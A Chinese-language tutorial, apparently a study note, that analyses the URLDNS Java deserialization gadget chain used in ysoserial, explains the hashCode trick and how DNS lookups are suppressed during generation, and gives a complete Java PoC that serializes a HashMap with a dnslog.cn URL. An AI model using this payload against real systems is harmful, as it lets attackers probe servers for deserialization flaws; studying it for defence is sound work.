Gadget：
```
/**
 * Gadget Chain:
 *  HashMap.readObject() -> putVal(....) -> hash()
 *      URL.hashCode() 此处判断hashCode必须是-1，否则不会继续往下走
 *          URLStreamHandler.hashCode() -> getHostAddress() -> InetAddress.getByName()
 */
```
HashMap.readObject()的末尾一行：
``` 
putVal(hash(key), key, value, false, false);
```
调用了hash方法，该方法用来计算hash：
``` 
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
key如果是URL对象，就会调用URL.hashCode。
```java
public synchronized int hashCode() {
    if (hashCode != -1)
        return hashCode;

    hashCode = handler.hashCode(this);
    return hashCode;
}
```
这里有两个点要注意，第一是hashCode，第二是handler.hashCode。

---
先看第一点

URL.hashCode()会对hashCode进行判断，如果不为-1，就会return，无法继续向下执行，Gadget从而中断：
因此包括ysoserial在内的项目在生成URL对象后会将其hashCode设定为-1：
```java
Field hashCodeField = URL.class.getDeclaredField("hashCode");
hashCodeField.setAccessible(true);
hashCodeField.set(url, -1);
```
但是为什么要在将URL对象放入hashMap以后，再改hashCode呢？如果在new URL对象以后直接给hashCode赋值行不行？

不行，这是因为HashMap在put以后，会调用HashMap.hash->URL.hashCode方法计算hash，那么代码流程就变成了：
```java
// new URL
URL url = new URL(null, "http://12.saitu4.dnslog.cn", URLStreamHanderObj);

// 给hashCode赋值
Field hashCodeField = URL.class.getDeclaredField("hashCode");
hashCodeField.setAccessible(true);
hashCodeField.set(url, -1);

HashMap hashMap = new HashMap();
hashMap.put(url, "");  // 重新计算hashCode并赋值
```
于是我们赋值-1就失效了，最后在反序列化时，也就不会进入Gadget流程。

---
再看第二点。

可以看到hashCode中调用了handler.hashCode，如果handler是URLStreamHandler，就会调用URLStreamHandler.hashCode:
```java
// u 即URL对象
InetAddress addr = getHostAddress(u);
```
后续是DNS请求，就不跟进了。


---

由于HashMap的put方法会调用hash：
```java
public V put(K key, V value) {
    return putVal(hash(key), key, value, false, true);
}
```
本质上跟反序列化时过程是一样的，这意味着在生成POC阶段，就会进行一次DNS解析，从而污染DNSlog，因此需要避免这种现象，如何避免？

我们来看put方法调用过程：
``` 
HashMap.put() -> HashMap.hash(key) 
    URL.hashCode()
        URLStreamHandler.hashCode() -> getHostAddress(u)
            InetAddress.getByName(host)
```
如果能够打断这个过程，就不会影响DNS记录。

由于URLStreamHandler是个抽象类，所以我们在使用时，要么new一个子类，要么自己实现一个子类。

ysoserial作者的选择是自己写一个子类，并重写getHostAddress方法来打断。
```java
static class SilentURLStreamHandler extends URLStreamHandler {

    protected URLConnection openConnection(URL u) throws IOException {
            return null;
    }

    protected synchronized InetAddress getHostAddress(URL u) {
            return null;
    }
}
```
openConnection因为是抽象方法，必须要实现，本身没什么用：
```java
abstract protected URLConnection openConnection(URL u) throws IOException;
```

不过我的选择是重写hashCode：
```java
@Override
protected int hashCode(URL u) {
    return -1;
}
```
也能打断后续dns解析步骤，不过，他还有其他的妙用，还记得前面说过的，HashMap.put会重新计算hash吗？他是调用URLtreamHandler.hashCode来实现的：
```java
public synchronized int hashCode() {
    if (hashCode != -1)
        return hashCode;

    hashCode = handler.hashCode(this);
    return hashCode;
}
```
那我重写了hashCode方法，直接return -1，不就不必在后续手动给hashCode赋值了吗。

完整代码如下：
```java
import java.io.*;
import java.lang.reflect.Field;
import java.net.*;
import java.util.HashMap;

public class GenURLDNS {
    /**
     * Gadget Chain:
     * HashMap.readObject() -> putVal(....) -> hash()
     * URL.hashCode() 此处判断hashCode必须是-1，否则不会继续往下走
     * URLStreamHandler.hashCode() -> getHostAddress() -> InetAddress.getByName()
     */
    public static void main(String[] args) throws Exception {
        URLStreamHandler URLStreamHanderObj = new URLStreamHandler() {
            @Override
            protected URLConnection openConnection(URL u) throws IOException {
                return null;
            }

            @Override
            protected int hashCode(URL u) {
                return -1;
            }
        };
        URL url = new URL(null, "http://13.2f882y.dnslog.cn", URLStreamHanderObj);

        HashMap hashMap = new HashMap();
        hashMap.put(url, "");

//        Field hashCodeField = URL.class.getDeclaredField("hashCode");
//        hashCodeField.setAccessible(true);
//        hashCodeField.set(url, -1);
//        序列化
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashMap);
        byte[] bytes = byteArrayOutputStream.toByteArray();

//        反序列化
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }

}
```